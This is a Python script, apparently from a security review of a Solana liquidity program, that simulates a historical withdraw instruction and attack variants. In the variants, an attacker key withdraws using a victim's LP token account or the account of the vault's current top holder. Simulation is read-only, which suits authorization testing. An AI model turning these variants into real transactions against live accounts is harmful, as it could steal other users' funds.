#!/usr/bin/env python3
"""Withdraw simulations: replay + attack variants. Read-only simulateTransaction."""
import base64, hashlib, json, sys
sys.path.insert(0, "/home/heisenberg/CA/armada/analysis")
from solrpc import *
from simtx import simulate, summarize

PROG = "ArmN3Av2boBg8pkkeCK9UuCN9zSUVc2UQg1qR2sKwm8d"
A = "/home/heisenberg/CA/armada/analysis"
s = json.load(open(f"{A}/ix-full-samples.json"))
w = s["withdraw"][0]
accts = w["accounts"]
data = b58decode(w["data"])
lp_amount = int.from_bytes(data[8:16], "little")
min_a = int.from_bytes(data[16:24], "little")
min_b = int.from_bytes(data[24:32], "little")
print("historical withdraw:", w["sig"][:24], "slot", w["slot"], "err", w["err"])
print("lpAmount:", lp_amount, "minA:", min_a, "minB:", min_b, "n_accounts:", len(accts))
vault = accts[4]
print("vault:", vault)

# current state of key accounts
for i, name in [(0, "payer/hist"), (3, "userLpTokenAcct"), (4, "clpVault"), (5, "lpMint")]:
    info = spl_token_amount(accts[i]) if i in (0, 3) else None
    print(f"  [{i}] {name}: {accts[i]}")
    if info:
        print("       token acct:", info["owner"], "amount", info["amount"])

# current LP holders of this vault
r6 = json.load(open(f"{A}/recon6_lpholders.json"))
holders = r6[vault]["top"]
print("LP holders:", [(h["owner"][:10], h["amount"], h["ata"][:10]) for h in holders[:5]])

def run(label, payer, accounts, ix_data, return_accounts=None, extra_signers=()):
    ix = {"program_id": PROG, "accounts": accounts, "data": ix_data}
    res = simulate([ix], payer, extra_signers=extra_signers, return_accounts=return_accounts)
    summ = summarize(res)
    print(f"\n===== {label} =====")
    print("err:", summ["err"], "CU:", summ.get("unitsConsumed"))
    for l in summ["logs_tail"][:26]:
        print("   ", l)
    return res

# account metas: build (pubkey, is_signer, is_writable) from the historical tx: payer signs; all listed are writable except some.
# From IDL: payer signer (ro), userTokenA/B mut, userLp mut, clpVault ro, lpMint mut, tokenVaultA/B mut,
# positionBundleTokenAccount ro, clpProgram ro, clp mut, clpTokenVaultA/B mut, fee accounts mut, tokenProgram ro, remaining: position/tickarrays mut
def build_metas(accts, payer_idx=0):
    metas = []
    ro_idx = {4, 8, 9, 15}  # clpVault, positionBundleTokenAccount, clpProgram, tokenProgram
    for i, a in enumerate(accts):
        signer = (i == payer_idx)
        writable = i not in ro_idx
        metas.append((a, signer, writable))
    return metas

# --- Variant A: replay as the historical payer (may fail if LP already withdrawn) ---
metas = build_metas(accts)
run("A. replay historical withdraw (same accounts)", accts[0], metas, data,
    return_accounts=[accts[3], accts[1], accts[2]])

# --- Variant B: attacker payer != LP owner ---
attacker = "2xFbZtJjR3szsVXrjVwU35uA9uk35xujNufdUzPFsqFL"
metas_b = build_metas(accts)
run("B. attacker payer, victim LP account", attacker, metas_b, data,
    return_accounts=[accts[3], accts[1], accts[2]])

# --- Variant C: attacker with LP account of a *different* holder (current holder) ---
cur = holders[0]
accts_c = list(accts)
accts_c[3] = cur["ata"]      # userLpTokenAcct = current holder's LP account
accts_c[1] = accts[1]        # keep victim token accounts (only testing LP ownership)
accts_c[2] = accts[2]
metas_c = build_metas(accts_c)
run("C. payer=MM key(not LP owner), LP acct = current holder", attacker, metas_c, data,
    return_accounts=[cur["ata"]])

# --- Variant D: self-withdraw by current holder (real holder as payer) ---
metas_d = build_metas(accts_c)
run("D. self-withdraw: current holder as payer (fair-value check)", cur["owner"], metas_d, data,
    return_accounts=[cur["ata"], accts[1], accts[2], accts[5]])
